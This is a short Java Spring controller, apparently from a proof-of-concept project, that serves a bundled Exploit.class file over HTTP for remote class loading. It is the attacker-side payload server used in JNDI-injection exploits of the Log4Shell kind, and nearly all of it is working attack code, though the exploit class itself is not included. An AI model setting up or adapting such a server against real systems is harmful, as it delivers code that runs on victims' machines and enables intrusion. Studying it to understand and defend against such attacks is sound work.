package com.kossatzd;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class MaliciousController {

	@GetMapping(value = "/Exploit.class")
	public @ResponseBody byte[] exploit() {

		System.out.println("Received call for Exploit.class");

		try {
			InputStream inputStream = MaliciousController.class.getResourceAsStream("/Exploit.class");
			ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

			if (inputStream == null) {
				System.out.println("Not Found");
				return null;
			} else {
				while (inputStream.available() > 0) {
					byteArrayOutputStream.write(inputStream.read());
				}

				return byteArrayOutputStream.toByteArray();
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		return null;
	}
}
